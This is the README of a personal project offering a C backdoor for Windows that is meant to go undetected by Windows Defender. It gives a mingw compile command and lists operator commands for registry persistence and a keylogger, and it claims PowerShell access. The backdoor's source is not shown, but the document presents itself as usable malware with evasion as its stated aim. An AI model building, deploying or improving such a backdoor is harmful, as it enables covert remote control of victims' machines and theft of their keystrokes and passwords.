# BACKDOOR-C

 Personal project of realization of an undectable C backdoor under windows defender (before passage under total virus)

# INSTALLATION

To use the backdoor :

`i686-w64-mingw32-gcc -o test.exe back.c -lwsock32 -lwininet`

Replace test.exe by the name you want to call your executable file and it's done !

# The project :

The backdoor is functional under Windows and includes a persistent mode, a keylogger and a powershell access.

## Command to use it 

- persist : to use the persist mode and create an HKEY_CURRENT_KEY
- keylog_on : ton activate the keylogger
